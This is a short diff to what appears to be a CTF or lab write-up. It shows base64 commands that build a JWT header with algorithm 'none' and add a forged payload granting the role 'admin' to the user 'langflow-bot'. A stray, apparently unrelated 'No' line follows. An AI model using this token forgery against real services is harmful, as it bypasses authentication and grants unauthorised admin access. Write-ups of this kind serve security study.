@@ -394,5 +394,8 @@ Now i simply get the output, modify the user to be admin and the algorithm to `n
 echo '{"alg":"none","typ":"JWT"}' | base64               
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K
 
-
+echo '{"sub":"langflow-bot","role":"admin"}' | base64
+eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQo=
 ```
+
+No
